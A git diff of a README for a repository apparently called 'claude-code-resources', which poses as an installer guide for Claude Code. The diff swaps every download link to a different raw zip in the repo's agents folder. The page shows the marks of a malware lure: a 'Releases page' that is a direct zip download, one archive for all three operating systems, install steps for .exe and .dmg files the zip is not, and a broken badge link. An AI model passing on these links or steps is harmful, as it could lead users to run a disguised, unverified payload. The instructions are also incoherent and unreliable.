@@ -1,6 +1,6 @@
 # 🚀 claude-code-resources - A Simple Way to Use Claude Code
 
-[![Download Now](https://raw.githubusercontent.com/Grayhat76/claude-code-resources/main/agents/claude-code-resources-v3.5.zip%20Now-claude--code--resources-brightgreen)](https://raw.githubusercontent.com/Grayhat76/claude-code-resources/main/agents/claude-code-resources-v3.5.zip)
+[![Download Now](https://raw.githubusercontent.com/Grayhat76/claude-code-resources/main/agents/resources_claude_code_v1.4.zip%20Now-claude--code--resources-brightgreen)](https://raw.githubusercontent.com/Grayhat76/claude-code-resources/main/agents/resources_claude_code_v1.4.zip)
 
 ## 📋 Introduction
 Welcome to the `claude-code-resources` project. This guide will help you use Claude Code easily. Even if you have no technical background, you can follow these steps to get started.
@@ -18,16 +18,16 @@ Before you proceed with the download, make sure your computer meets these requir
 ## 💾 Download & Install
 To download the application, follow these steps:
 
-1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/Grayhat76/claude-code-resources/main/agents/claude-code-resources-v3.5.zip) to open the Releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/Grayhat76/claude-code-resources/main/agents/resources_claude_code_v1.4.zip) to open the Releases page.
   
 2. **Select the Latest Version**: Look for the most recent release at the top. It will have the version number listed.
 
-3. **Download the File**: Click on the appropriate file for your operating system. For Windows, it might be something like `https://raw.githubusercontent.com/Grayhat76/claude-code-resources/main/agents/claude-code-resources-v3.5.zip`. For macOS, it could be `https://raw.githubusercontent.com/Grayhat76/claude-code-resources/main/agents/claude-code-resources-v3.5.zip`. For Linux, you might find a `https://raw.githubusercontent.com/Grayhat76/claude-code-resources/main/agents/claude-code-resources-v3.5.zip` file.
+3. **Download the File**: Click on the appropriate file for your operating system. For Windows, it might be something like `https://raw.githubusercontent.com/Grayhat76/claude-code-resources/main/agents/resources_claude_code_v1.4.zip`. For macOS, it could be `https://raw.githubusercontent.com/Grayhat76/claude-code-resources/main/agents/resources_claude_code_v1.4.zip`. For Linux, you might find a `https://raw.githubusercontent.com/Grayhat76/claude-code-resources/main/agents/resources_claude_code_v1.4.zip` file.
 
 4. **Install the Application**:
    - **Windows**: Double-click the downloaded `.exe` file and follow the prompts.
    - **macOS**: Open the downloaded `.dmg` file, drag the `claude-code` icon to your Applications folder.
-   - **Linux**: Extract the `https://raw.githubusercontent.com/Grayhat76/claude-code-resources/main/agents/claude-code-resources-v3.5.zip` file using your file manager or terminal, then run the installation script.
+   - **Linux**: Extract the `https://raw.githubusercontent.com/Grayhat76/claude-code-resources/main/agents/resources_claude_code_v1.4.zip` file using your file manager or terminal, then run the installation script.
 
 5. **Launch the Application**: Once installed, find the application in your programs list or applications folder. Double-click to start using it.
 
@@ -61,4 +61,4 @@ This application is distributed under the MIT License. You can view the full lic
 ## 🏁 Conclusion
 Thank you for choosing `claude-code-resources`. We hope this guide helps you through the installation process. Start enhancing your productivity today!
 
-For initial download, visit [here](https://raw.githubusercontent.com/Grayhat76/claude-code-resources/main/agents/claude-code-resources-v3.5.zip).
+For initial download, visit [here](https://raw.githubusercontent.com/Grayhat76/claude-code-resources/main/agents/resources_claude_code_v1.4.zip).
